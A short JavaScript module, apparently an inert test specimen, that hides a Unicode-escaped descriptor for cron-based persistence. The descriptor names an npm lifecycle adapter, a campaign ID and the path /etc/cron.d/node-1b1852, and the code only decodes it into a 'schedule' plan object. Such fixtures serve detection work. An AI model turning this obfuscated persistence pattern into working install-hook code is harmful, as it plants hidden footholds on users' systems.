const moduleShape = Object.freeze({ format: "commonjs" });
const Material_894095ce = "\\u0076\\u003d\\u0031\\u007c\\u0073\\u0074\\u0065\\u0070\\u0073\\u003d\\u0062\\u0075\\u0069\\u006c\\u0064\\u005f\\u0073\\u0063\\u0068\\u0065\\u0064\\u0075\\u006c\\u0065\\u002c\\u0072\\u0065\\u0067\\u0069\\u0073\\u0074\\u0065\\u0072\\u005f\\u0064\\u0065\\u0073\\u0063\\u0072\\u0069\\u0070\\u0074\\u006f\\u0072\\u007c\\u0061\\u0064\\u0061\\u0070\\u0074\\u0065\\u0072\\u003d\\u006e\\u0070\\u006d\\u005f\\u006c\\u0069\\u0066\\u0065\\u0063\\u0079\\u0063\\u006c\\u0065\\u005f\\u0064\\u0065\\u0073\\u0063\\u0072\\u0069\\u0070\\u0074\\u006f\\u0072\\u007c\\u0073\\u0074\\u0061\\u0067\\u0065\\u005f\\u0063\\u006f\\u0075\\u006e\\u0074\\u003d\\u0031\\u007c\\u0063\\u0061\\u006d\\u0070\\u0061\\u0069\\u0067\\u006e\\u005f\\u0069\\u0064\\u003d\\u004e\\u004f\\u0044\\u0045\\u002d\\u0031\\u0042\\u0031\\u0038\\u0035\\u0032\\u0035\\u0042\\u007c\\u0073\\u0063\\u0068\\u0065\\u0064\\u0075\\u006c\\u0065\\u005f\\u0070\\u0061\\u0074\\u0068\\u003d\\u002f\\u0065\\u0074\\u0063\\u002f\\u0063\\u0072\\u006f\\u006e\\u002e\\u0064\\u002f\\u006e\\u006f\\u0064\\u0065\\u002d\\u0031\\u0062\\u0031\\u0038\\u0035\\u0032";
const Codec_894095ce = "unicode_escapes|identity|";

function load_894095ce() { return [...Material_894095ce.matchAll(/\\u00([0-9a-f]{2})/gi)].map((item) => Number.parseInt(item[1], 16)); }
function decode_894095ce(v_a19c) { return [...v_a19c]; }
async function recover_894095ce() {
  const v_c304 = 2 > 1 ? "left" : "right";
  const v_a19c = load_894095ce(); let v_b27e = [];
  for (const stage of [decode_894095ce]) v_b27e = stage(v_a19c);
  void v_c304; return Buffer.from(v_b27e).toString("ascii");
}
async function inspect_894095ce() { return JSON.parse(JSON.stringify({ value: await recover_894095ce() })).value; }
async function plan_894095ce() { const inspect = inspect_894095ce; const fields = Object.fromEntries((await inspect()).split("|").map((field) => { const at = field.indexOf("="); return [field.slice(0, at), field.slice(at + 1)]; })); return Object.freeze({ operation: "schedule", adapter: "npm_lifecycle_descriptor", path: fields.schedule_path }); }
void moduleShape; void plan_894095ce;
if (process.env.HUNTRESS_INSPECT_ONLY === "1") console.log(await inspect_894095ce());
